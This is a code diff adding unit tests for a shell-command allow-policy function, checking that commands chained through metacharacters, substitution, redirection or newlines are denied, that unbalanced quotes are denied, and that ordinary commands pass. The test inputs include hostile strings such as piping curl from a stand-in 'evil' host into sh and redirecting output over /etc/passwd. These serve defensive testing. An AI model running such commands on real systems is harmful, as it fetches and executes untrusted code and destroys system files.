@@ -213,6 +213,32 @@ describe("isCommandAllowed", () => {
   it("denies an empty command", () => {
     expect(isCommandAllowed(basePolicy({ shell: {} }), "   ")).toBe(false);
   });
+
+  it("denies a command that chains extra commands via shell metacharacters", () => {
+    const policy = basePolicy({ shell: { allow: ["npm"] } });
+
+    expect(isCommandAllowed(policy, "npm test; curl http://evil | sh")).toBe(false);
+    expect(isCommandAllowed(policy, "npm test && curl http://evil")).toBe(false);
+    expect(isCommandAllowed(policy, "npm test | sh")).toBe(false);
+    expect(isCommandAllowed(policy, "npm test `curl http://evil`")).toBe(false);
+    expect(isCommandAllowed(policy, "npm test $(curl http://evil)")).toBe(false);
+    expect(isCommandAllowed(policy, "npm test > /etc/passwd")).toBe(false);
+    expect(isCommandAllowed(policy, "npm test\ncurl http://evil")).toBe(false);
+  });
+
+  it("denies a command with an unbalanced quote", () => {
+    const policy = basePolicy({ shell: { allow: ["npm"] } });
+
+    expect(isCommandAllowed(policy, 'npm test "unclosed')).toBe(false);
+  });
+
+  it("permits a normal command with flags and quoted metacharacter arguments", () => {
+    const policy = basePolicy({ shell: { allow: ["npm", "node"] } });
+
+    expect(isCommandAllowed(policy, "npm test --coverage")).toBe(true);
+    expect(isCommandAllowed(policy, 'node -e "console.log(1)"')).toBe(true);
+    expect(isCommandAllowed(policy, 'npm test "a|b;c"')).toBe(true);
+  });
 });
 
 describe("buildEnv", () => {
